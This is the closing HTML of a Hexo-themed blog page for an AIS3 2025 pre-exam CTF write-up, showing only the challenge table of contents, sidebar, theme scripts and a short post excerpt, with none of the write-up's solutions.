+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ais3-2025-pre-exam-myfirst-ctf-write-up"><span class="toc-number">1.</span> <span class="toc-text"> AIS3 2025 pre-exam &amp; myfirst ctf write up</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-mfctfopre-examx"><span class="toc-number">1.1.</span> <span class="toc-text"> misc [mfctf(o)&#x2F;pre-exam(x)]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#welcome"><span class="toc-number">1.1.1.</span> <span class="toc-text"> Welcome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ramen-ctf"><span class="toc-number">1.1.2.</span> <span class="toc-text"> Ramen CTF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ais3-tiny-server-web-misc"><span class="toc-number">1.1.3.</span> <span class="toc-text"> AIS3 Tiny Server - Web &#x2F; Misc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-mfctfopre-examx"><span class="toc-number">1.2.</span> <span class="toc-text"> Web [mfctf(o)&#x2F;pre-exam(x)]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tomorin-db"><span class="toc-number">1.2.1.</span> <span class="toc-text"> Tomorin db 🐧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#login-screen-1"><span class="toc-number">1.2.2.</span> <span class="toc-text"> Login Screen 1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-mfctfxpre-examo"><span class="toc-number">1.3.</span> <span class="toc-text"> pwn [mfctf(x)&#x2F;pre-exam(o)]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#welcome-to-the-world-of-ave-mujica"><span class="toc-number">1.3.1.</span> <span class="toc-text"> Welcome to the World of Ave Mujica🌙</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse-mfctfxpre-examo"><span class="toc-number">1.4.</span> <span class="toc-text"> reverse [mfctf(x)&#x2F;pre-exam(o)]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ais3-tiny-server-reverse"><span class="toc-number">1.4.1.</span> <span class="toc-text"> AIS3 Tiny Server - Reverse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-flag-checker-mfctfxpre-examo"><span class="toc-number">1.4.2.</span> <span class="toc-text"> web flag checker [mfctf(x)&#x2F;pre-exam(o)]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-mfctfxpre-examo"><span class="toc-number">1.5.</span> <span class="toc-text"> crypto [mfctf(x)&#x2F;pre-exam(o)]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stream"><span class="toc-number">1.5.1.</span> <span class="toc-text"> Stream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#random_rsa"><span class="toc-number">1.5.2.</span> <span class="toc-text"> Random_RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#slowecdsa"><span class="toc-number">1.5.3.</span> <span class="toc-text"> SlowECDSA</span></a></li></ol></li></ol></li></ol>
+  
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Auron" class="lazyload">
+  <div class="sidebar-author-name">Auron</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Auron",
+          title: "AIS3 2025 pre-exam &amp; myfirst ctf write up",
+          url: "http://example.com/2025/09/02/AIS3%202025%20pre-exam%20&amp;%20myfirst%20ctf%20write%20up/",
+          excerpt: "",
+          description: "",
+          stripContent: " AIS3 2025 pre-exam &amp;amp; myfirst ctf write up [mfctf(o)/pre-exam(x)] 代表的是在mfctf有解出來但是pre-exam沒解 pre-exam排名73  mfctf排名7  ㄏㄏ只比mfctf多300分, 可以再廢一點  misc [mfctf(o)/pre-exam(x)]  Welcome 已經給了, 不過不能複製貼上我直接手打  flag : AIS3{Welcome_And_Enjoy_The_CTF_!}  用goog",
+          date: "Tue Sep 02 2025 10:32:00 GMT+0800",
+          updated: "Tue Sep 02 2025 10:32:25 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.9.1' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
